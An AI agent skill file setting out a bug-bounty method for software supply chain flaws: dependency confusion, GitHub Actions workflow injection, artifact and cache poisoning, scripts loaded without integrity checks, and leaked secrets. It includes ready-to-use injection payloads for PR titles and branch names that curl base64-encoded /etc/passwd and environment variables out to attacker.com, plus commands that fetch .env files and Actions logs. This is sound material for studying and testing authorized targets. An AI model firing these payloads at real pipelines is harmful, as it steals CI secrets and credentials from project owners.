---
name: hunt-supply-chain
description: Hunt software supply chain vulnerabilities — dependency confusion (private package names on public registries), typosquatting on popular packages, GitHub Actions workflow injection via untrusted input (pull_request_target, issue title, PR body), artifact poisoning, cache poisoning in CI pipelines, compromised third-party scripts loaded in production (Polyfill, analytics, CDN), SAST bypass via malicious linting rules, and secrets exposed in public GitHub repos or Actions logs. Use when testing developer tooling, CI/CD pipelines, package ecosystems, or any app that loads third-party scripts. High payout on bounty programs that include CI/CD in scope. Keywords: supply chain, dependency confusion, npm, PyPI, GitHub Actions, workflow, artifact, CI/CD, package.json, requirements.txt.
sources: hackerone_public, github_security_lab
report_count: 22
---

# HUNT-SUPPLY-CHAIN — Dependency Confusion, CI Injection & Third-Party Compromise

## Crown Jewel Targets

| Target type | Attack vector | Payout range |
|---|---|---|
| Large tech companies with internal packages | Dependency confusion → code exec in prod | $10k–$100k+ |
| Open source projects with GH Actions | Workflow injection → secrets exfil | $5k–$30k |
| Apps loading CDN scripts without SRI | CDN compromise → XSS on all users | $3k–$20k |
| Companies with public GitHub repos | Exposed secrets in history/logs | $1k–$10k |
| npm/PyPI package maintainers | Account takeover → malicious publish | $5k–$30k |

Supply chain attacks have the widest blast radius of any bug class — a single package infection can compromise thousands of downstream consumers.

---

## Attack Surface Signals

**Package files to inspect:**
```
package.json, package-lock.json, yarn.lock
requirements.txt, setup.py, Pipfile, pyproject.toml
Gemfile, Gemfile.lock
go.mod, go.sum
Cargo.toml, Cargo.lock
pom.xml, build.gradle
```

**GitHub Actions files:**
```
.github/workflows/*.yml
.github/workflows/*.yaml
```

**Third-party scripts in HTML:**
```html
<script src="https://cdn.polyfill.io/...">
<script src="https://cdn.jsdelivr.net/...">
<script src="https://unpkg.com/...">
```

**CI configuration files:**
```
.travis.yml, .circleci/config.yml, Jenkinsfile, .gitlab-ci.yml
bitbucket-pipelines.yml, azure-pipelines.yml
```

---

## Step-by-Step Hunting Methodology

### Phase 1 — Dependency confusion

**Concept:** If a company uses private packages (e.g., `@company/auth`, `company-internal-lib`), publishing a higher-versioned package with the same name on the public registry causes package managers to prefer the public (malicious) version.

**Detection:**
```bash
# Find private package names from public sources
cat package.json | jq '.dependencies | keys[]' | grep -E '@company|internal|private'

# Check if package exists on public registry
npm show @target-company/internal-package 2>&1 | grep -i "404\|not found"
# 404 = doesn't exist publicly = potentially vulnerable

# For Python
pip3 index versions target-company-internal-package 2>&1

# For Ruby
gem search target-company-internal-gem
```

**Finding private package names:**
```bash
# GitHub search
gh search code "@company/internal" --extension=json -l JavaScript

# Public npm config leaks
curl https://target.com/package.json 2>/dev/null

# Job postings often mention internal packages
# Source maps: https://target.com/app.js.map  → original module names

# Error messages in app responses
# Stack traces mentioning /home/user/company-internal/
```

**Reporting:** If you find a private package name NOT on the public registry, this is a reportable finding. Many programs pay for the vulnerability class alone without requiring exploitation. **Never publish a malicious package** — just demonstrate you identified the gap.

### Phase 2 — GitHub Actions workflow injection

**Dangerous trigger: `pull_request_target`**

```yaml
# VULNERABLE: reads attacker-controlled input in privileged context
on:
  pull_request_target:
    types: [opened, edited]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # ← checks out attacker's code!
      - run: npm run build
```

**Injection via issue title, PR body, branch name:**
```yaml
# VULNERABLE: unsanitized user input in run step
- name: Comment PR
  run: |
    echo "PR title: ${{ github.event.pull_request.title }}"
    # Attacker PR title: "; curl https://attacker.com/?d=$(cat /etc/passwd)"
```

**What to look for:**
```bash
# Scan all workflow files
grep -rn "pull_request_target\|issue_comment\|issues:" .github/workflows/

# Find untrusted input usage
grep -rn "github.event.pull_request.title\|github.event.issue.title\|github.head_ref" .github/workflows/

# Find secret access + untrusted input in same job
grep -rn "secrets\." .github/workflows/ | grep -B5 "github.event"
```

**Injection payload for PR title:**
```
"; cat /etc/passwd | base64 | curl -d @- https://attacker.com #
```

For branch name injection:
```
feat/normal-feature"; curl https://attacker.com/?d=$(env | base64);"
```

### Phase 3 — Actions artifact poisoning

1. A workflow uploads build artifacts
2. Another workflow downloads and executes those artifacts
3. If the download step doesn't pin the artifact source → can you submit a PR to a fork, get it built, and have the artifact consumed by the privileged workflow?

```yaml
# Look for this pattern
- uses: actions/download-artifact@v3
  with:
    name: build-output  # where does this come from?
```

### Phase 4 — Actions cache poisoning

```yaml
# Vulnerable: cache key includes mutable input
- uses: actions/cache@v3
  with:
    key: ${{ runner.os }}-node-${{ github.event.pull_request.head.sha }}
    path: node_modules/
```

If an attacker can get a cached artifact from a malicious PR into a cache shared with the main branch workflow.

### Phase 5 — Third-party script integrity

Any script loaded without Subresource Integrity (SRI) is a single CDN compromise away from XSS on all users:

```bash
# Find scripts without integrity attribute
grep -rn '<script src=' public/ app/ | grep -v 'integrity='

# Automated
curl -s https://target.com | grep -oP '<script[^>]+src="[^"]+"' | grep -v 'integrity'
```

**High-risk CDNs:** polyfill.io (was compromised June 2024), unpkg.com, cdn.jsdelivr.net, cdnjs.cloudflare.com

**Check for Polyfill.io specifically:**
```bash
curl -s https://target.com | grep polyfill
```

### Phase 6 — Secrets in GitHub repos and Actions logs

```bash
# TruffleHog — scans git history for secrets
trufflehog git https://github.com/target/repo --only-verified

# GitLeaks
gitleaks detect --source . --log-opts "-all"

# Search Actions logs (via GH API if public repo)
gh api repos/TARGET/REPO/actions/runs --jq '.[].id' | head -5 | \
  xargs -I{} gh api repos/TARGET/REPO/actions/runs/{}/logs

# Search GitHub for exposed secrets
gh search code "AWS_ACCESS_KEY_ID" --owner target-org

# Check for exposed .env files
curl https://target.com/.env
curl https://target.com/.env.production
curl https://target.com/.env.local
```

### Phase 7 — Typosquatting detection

Check if the target's key packages have popular typosquats that may have infected their devs:

```bash
# Common patterns: extra letter, letter swap, wrong TLD
# nmap → namp, nnmap, nmapp
# requests → reqeusts, rquests

# Check download counts (high downloads on a new package = suspicious)
npm search "companyname-" | awk '{print $1}' | xargs -I{} npm show {} time --json | jq -r 'to_entries|last|.key + " " + .value'
```

---

## Automation

```bash
# Dependency confusion scanner
pip3 install confused
confused -l requirements.txt -e pypi

# for npm
npm_confused package.json

# GitHub Actions security scanner
actionlint .github/workflows/*.yml
zizmor .github/workflows/*.yml  # checks for injection vulnerabilities

# TruffleHog for secret scanning
trufflehog git https://github.com/target/repo --only-verified

# Nuclei supply chain templates
nuclei -u https://target.com -t exposures/tokens/

# Check exposed config files
ffuf -u "https://target.com/FUZZ" -w config_files.txt -mc 200
```

---

## Chain Table

| Finding | Chain to | Impact |
|---|---|---|
| Dependency confusion (name available) | Publish package → RCE in prod build | Critical |
| GH Actions injection | CI secret exfil → cloud access | Critical |
| Third-party script without SRI | CDN compromise → persistent XSS | Critical |
| Secrets in GH history | Direct credential use | High–Critical |
| Artifact poisoning | RCE in privileged workflow | Critical |
| Actions log secret leak | Same as exposed secret | High |

---

## Validation

✅ **Confirmed dependency confusion:** Private package name not on public registry AND package manager would prefer public over private registry version

✅ **Confirmed Actions injection:** Payload in PR title/branch name causes the injected command to execute (confirm via OOB callback)

✅ **Confirmed SRI missing:** Script loads without `integrity` attribute from a third-party CDN

✅ **Confirmed secret leak:** TruffleHog reports verified credential in git history or Actions log

### Severity assessment

| Scenario | CVSS | Typical payout |
|---|---|---|
| Dependency confusion → prod RCE | Critical 9.8 | $10k–$100k+ |
| Actions injection → CI secrets | Critical 9.3 | $5k–$30k |
| Third-party script no SRI | High 8.1 | $2k–$10k |
| Exposed secret in git history | High 7.5 | $1k–$8k |
| Private package name available | Medium 5.0 | $500–$3k |

### Related skills

Cross-reference: `hunt-cicd` (for broader CI/CD security), `hunt-ssrf-cloud` (for credential use after secret exfil), `hunt-llm-injection` (if AI tools are part of the CI pipeline).
